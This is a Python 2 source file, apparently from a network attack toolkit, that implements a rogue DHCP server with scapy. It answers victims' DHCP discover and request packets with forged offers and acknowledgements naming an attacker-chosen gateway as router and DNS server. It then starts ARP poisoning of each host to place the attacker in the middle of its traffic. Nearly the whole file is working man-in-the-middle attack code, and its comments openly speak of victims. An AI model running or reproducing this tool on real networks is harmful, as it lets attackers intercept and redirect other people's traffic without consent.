import util
from threading import Thread
from arp import ARPSpoof 
from scapy.all import *

#
# Set up a rogue DHCP server and hand out IP addresses.  Once an IP has been dispensed, an
# ARP poisoning session will be initiated for the host.  If the rogue DHCP is shutdown with hosts,
# the ARP poisoning session will be destroyed, but the victim IP addresses we handed out will be the same.
# This will allow the attacker an ability to configure an ARP poisoning session in the future if they so choose.
#
# ARP poisons will not appear under sessions, but will instead be managed by the spoofed_hosts dictionary.
# Configure sniffers for traffic.
#
class DHCPSpoof:
	def __init__(self):
		conf.verb = 0
		self.local_mac = get_if_hwaddr(conf.iface)
		self.spoofed_hosts = {}
		self.curr_ip = None
		self.gateway = None
		self.net_mask = None

		self.running = False
		self.dump_data = False
		self.log_data = False
		self.log_file = None

	def initialize(self):
		try:
			self.gateway = raw_input('[!] Enter (spoofed) gateway: ')
			self.net_mask = raw_input('[!] Enter netmask to hand IPs out from: ')
			tmp = raw_input('[!] Forward all traffic to %s.  Assign IP\'s from %s.  Is this correct? '%(self.gateway,self.net_mask))
			if 'n' in tmp.lower():
				return False
			util.Msg('Configuring rogue DHCP server..')
			thread = Thread(target=self.netsniff)
			thread.start()
			self.running = True
			return True
		except Exception, j:
			util.Error('[-] Error: %s'%j)
			return False
	
	#
	# sniff packets
	#
	def netsniff(self):
		sniff(prn=self.pkt_handler,store=0,stopper=self.test_stop,stopperTimeout=3)

	#
	# Handle traffic; wait for DHCPREQ or DHCPDISC; there are two cases.  Most systems, if they've 
	# previously connected to the network, will skip the discovery stage and make a DHCP REQUEST.
	# We can respond with a DHCPACK and hopefully get it; if we don't, we can still ARPP the host.
	#
	# New systems with DHCPDISCOVER first; in this case, we can quite easily gain control, give it
	# our own address, and ARPP it.  
	#
	def pkt_handler(self, pkt):
		# is this a DHCP packet!? 
		if self.running and DHCP in pkt:
			for opt in pkt[DHCP].options:
				# if the option is a REQUEST
				if type(opt) is tuple and opt[1] == 3:
					fam,hw = get_if_raw_hwaddr(conf.iface)

					# get the requested address
					requested_addr = None
					for item in pkt[DHCP].options:
						if item[0] == 'requested_addr':
							requested_addr = item[1]
					
					# if the IP address is the one we've reserved for it, we're golden.  Otherwise
					# we need to check if the one they're requesting is free
					if self.curr_ip != requested_addr:
						if not requested_addr in self.spoofed_hosts:
							# ip is free, set and use it
							self.curr_ip = requested_addr
						else:
							# ip is in use; generate another
							if self.curr_ip is None:
								self.curr_ip = self.net_mask.split('/')[0] 
							else:
								self.curr_ip = util.next_ip(self.curr_ip)

					lease = Ether(dst='ff:ff:ff:ff:ff:ff',src=hw)/IP(src=self.gateway,dst='255.255.255.255')/UDP(sport=67,dport=68)
					lease /= BOOTP(op=2,chaddr=mac2str(pkt[Ether].src),yiaddr=self.curr_ip,xid=pkt[BOOTP].xid)
					lease /= DHCP(options=[('message-type','ack'),
										   ('server_id', self.gateway),
										   ('lease_time', 86400),
										   ('subnet_mask', '255.255.255.0'),
										   ('router', self.gateway), 
										   ('name_server', self.gateway),
										   'end'])
					sendp(lease, loop=False)

					if self.dump_data: util.Msg('Handed \'%s\' out to \'%s\''%(self.curr_ip, pkt[Ether].src))
					util.debug('Initializing ARP spoofing...')
					tmp = ARPSpoof()
					tmp.to_ip = self.curr_ip
					tmp.from_ip = self.gateway
					if not tmp.initialize_post_spoof() is None:
						self.spoofed_hosts[self.curr_ip] = tmp 
						util.debug('ARP spoofing successfully configured for \'%s\''%self.curr_ip)
					else:
						if self.dump_data: util.Error('ARP session unsuccessful for %s!  You may not be able to get in the middle of them!'%self.curr_ip)
				# discover; send offer
				elif type(opt) is tuple and opt[1] == 1:
					fam,hw = get_if_raw_hwaddr(conf.iface)

					if self.curr_ip is None:
						self.curr_ip = self.net_mask.split('/')[0]
					else:
						self.curr_ip = util.next_ip(self.curr_ip)

					# build and send the DHCP Offer
					offer = Ether(dst='ff:ff:ff:ff:ff:ff',src=hw)/IP(src=self.gateway,dst='255.255.255.255')/UDP(sport=67,dport=68)
					offer /= BOOTP(op=2,chaddr=mac2str(pkt[Ether].src),yiaddr=self.curr_ip,xid=pkt[BOOTP].xid)
					offer /= DHCP(options=[('message-type', 'offer'),
										   ('subnet_mask','255.255.255.0'),
										   ('lease_time', 86400), 
										   ('name_server', self.gateway), 
										   ('router',self.gateway),
										    'end'])
					sendp(offer, loop=False)
					if self.dump_data: util.Msg('Sent DHCP offer for \'%s\' to \'%s\''%(self.curr_ip, pkt[Ether].src))

	#
	# DHCP view, for now, just dumps the IPs it's handed out
	#
	def view(self):
		print '\033[33m[!] Spoofed gateway: \033[32m%s\033[0m'%self.gateway
		print '\033[33m[!] Currently Spoofing:\033[0m'
		for key in self.spoofed_hosts:
			print '\t\033[32m[+] %s\033[0m'%self.spoofed_hosts[key].to_ip

		try:
			while True:
				self.dump_data = True
		except KeyboardInterrupt:
			self.dump_data = False
			return

	#
	# sniffer callback
	#
	def test_stop(self):
		if self.running:
			return False
		util.debug('Stopping dhcp threads..')
		return True

	#
	# shutdown the DHCP server and any ARP poisons
	#
	def shutdown(self):
		self.running = False

		# shutdown arp poisons if we have any running
		if len(self.spoofed_hosts.keys()) > 0:
			for key in self.spoofed_hosts:
				self.spoofed_hosts[key].shutdown()
		util.Msg('DHCP server shutdown.')

	# configure a logging session
	def log(self, opt, log_loc):
		pass
